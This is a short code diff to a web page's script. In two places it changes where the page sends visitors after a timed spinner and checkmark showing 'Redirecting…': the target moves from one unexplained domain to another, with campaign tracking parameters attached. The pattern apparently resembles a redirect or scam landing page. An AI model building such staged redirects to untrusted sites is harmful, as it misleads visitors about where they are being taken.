@@ -191,7 +191,7 @@
         helper.textContent = 'Redirecting…';
 
         // Small grace period for the checkmark animation
-        setTimeout(() => { window.location.href = 'http://p8r9.com/?utm_campaign=ttN5oc1jmM&v1=[v1]&v2=[v2]&v3=[v3]'; }, 600);
+        setTimeout(() => { window.location.href = 'http://w23hub.com/?utm_campaign=ttN5oc1jmM&v1=[v1]&v2=[v2]&v3=[v3]'; }, 600);
       }, 5000);
     }, 300); // "few milliseconds" before starting the spinner
   }
@@ -345,7 +345,7 @@
         helper.textContent = 'Redirecting…';
 
         // Small grace period for the checkmark animation
-        setTimeout(() => { window.location.href = 'http://p8r9.com/?utm_campaign=ttN5oc1jmM&v1=[v1]&v2=[v2]&v3=[v3]'; }, 600);
+        setTimeout(() => { window.location.href = 'http://w23hub.com/?utm_campaign=ttN5oc1jmM&v1=[v1]&v2=[v2]&v3=[v3]'; }, 600);
       }, 5000);
     }, 300); // "few milliseconds" before starting the spinner
   }
